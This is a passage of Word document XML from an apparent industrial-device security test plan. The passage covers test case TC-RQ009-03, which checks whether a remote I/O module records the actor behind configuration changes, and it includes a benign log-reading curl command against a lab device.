        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Counter +1 and I&amp;M4 changed (SRIO-3002/3011); no timestamp/actor; after cold start counter retained, Error Log cleared (SRIO-6521), uptime reset (SRIO-15398). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Counter durable ☐ Log detail volatile ☐ No time/actor (G-2/G-3 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0902_log_pre/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>chg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cold.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, TC0902_iandm_* reads, TC0902_tick_pre/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cold.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:hyperlink r:id="rId234" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A084078" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="0CF4154E">
          <v:rect id="_x0000_i1615" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="799DDF7B" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ009-03 — Actor Attribution Is Delegated, Not Device-Resident (G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3893721D" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6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7754"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="0A9291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8D82E7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E38C84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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="0FBB5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1C489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D8F9C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="2C96B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61942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3B72A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="da-DK"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="da-DK"/>
              </w:rPr>
              <w:t>RQ-009 → CR 2.12 → Asset B, Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="090F1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9BE51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706DC" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Repudiation (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>device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cannot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attribute</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>config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modification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="5FC38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F2C2B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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB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E3567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SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Vulnerability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> &amp; log review)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="19326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D16DF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lastRenderedPageBreak/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35009" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Demonstrate that because configuration is authored at the engineering tool and pushed from the (password-protected) PLC via fieldbus, the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>device holds no actor identity</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> for a config modification — attribution, if it exists, resides in the PLC/engineering project, </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on the SRIO. </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">This </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>bounds</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> CR 2.12 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>as</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>delegated</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">, not </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>implemented</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="3853F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0A8AA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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6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3676F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Perform an </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> config change from a known engineering-tool user. 2. Inspect every device-side evidence field (Error Log, I&amp;M records) for any actor/identity attribute. 3. Inspect the PLC/engineering side for where the actor identity actually resides. </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">4. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Conclude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where</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>if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anywhere</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">) non-repudiation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>is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anchored</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="31419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3C7BB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20DA1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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> no device-side field carries an actor identity → </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.12 not met at the device</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; attribution only at the PLC/TIA layer → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> as delegation. Documented as: device-level non-repudiation for config modification is architecturally impossible for this QM slave.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B8768DE" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="2E674B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CEE297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D7A1CF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r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="035B8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0197F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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6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F0691" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="28398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7126B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A88A9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 xml:space="preserve">SPS 192.168.0.1 (with user-access control), DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> path</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="61FE1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88EFD" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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266C9" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TIA Portal (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>user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login</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>change</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> log); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">/PN </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>reads</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>device</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>side</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">); NIST SP 800-115 §3.1/§3.2 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> &amp; log review</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B9BBD99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TC-RQ009-03 Where does the actor identity live?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C57FA1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Device side: confirm NO actor attribute in any evidence field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BE36CE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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId235" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | grep -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -E '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>user|actor|id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>' &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73494537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|| echo "no actor field on device"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF13AA7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># PLC side: export TIA audit trail / project change log -&gt; record the engineering-tool user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D63F342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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | No actor attribute device-side; actor (if any) only in the PLC/TIA layer (config "saved on the PLC, typically password-protected"). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ No device-side actor (G-1 confirmed as delegation) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Device grep output, TIA audit-trail export, architecture note citing fieldbus-sourced config | </w:t>
      </w:r>
      <w:hyperlink r:id="rId236" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E77F59A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="0AE2056A">
          <v:rect id="_x0000_i1616" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1611DB" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-009)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B7AA3D" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Config-modification markers correctly received here</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>REVISION_COUNTER</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M4</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are now RQ-009's </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>primary evidence surface</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (deferred in from the RQ-004/RQ-008 corrections). This closes the boundary loop: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identification</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-004/006) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software-intervention</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-008) no longer carry config-modification markers; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009 owns them.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId237" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="690AE264" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
